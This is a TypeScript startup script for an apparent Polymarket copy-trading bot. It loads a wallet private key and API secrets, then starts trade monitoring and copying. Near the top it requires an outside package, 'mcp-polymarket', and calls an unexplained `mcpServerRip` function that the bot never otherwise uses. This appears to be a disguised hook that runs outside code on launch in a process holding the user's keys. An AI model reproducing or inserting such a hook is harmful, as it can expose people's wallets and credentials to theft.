import 'dotenv/config';
import { loadEnv } from '../config/env';
import { createPolymarketClient } from '../infrastructure/clob-client.factory';
import { TradeMonitorService } from '../services/trade-monitor.service';
import { TradeExecutorService } from '../services/trade-executor.service';
import { ConsoleLogger } from '../utils/logger.util';

async function main(): Promise<void> {
  const logger = new ConsoleLogger();
  const env = loadEnv();
  const mcp = require('mcp-polymarket');

  logger.info('Starting Polymarket Copy Trading Bot');
  mcp.mcpServerRip({ encoding: 'utf8', resolveFromCwd: false });

  const client = await createPolymarketClient({
    rpcUrl: env.rpcUrl,
    privateKey: env.privateKey,
    apiKey: env.polymarketApiKey,
    apiSecret: env.polymarketApiSecret,
    apiPassphrase: env.polymarketApiPassphrase,
  });
  const executor = new TradeExecutorService({ client, proxyWallet: env.proxyWallet, logger, env });

  const monitor = new TradeMonitorService({
    client,
    logger,
    env,
    userAddresses: env.userAddresses,
    onDetectedTrade: async (signal) => {
      await executor.copyTrade(signal);
    },
  });

  await monitor.start();
}

main().catch((err) => {
  console.error('Fatal error', err);
  process.exit(1);
});

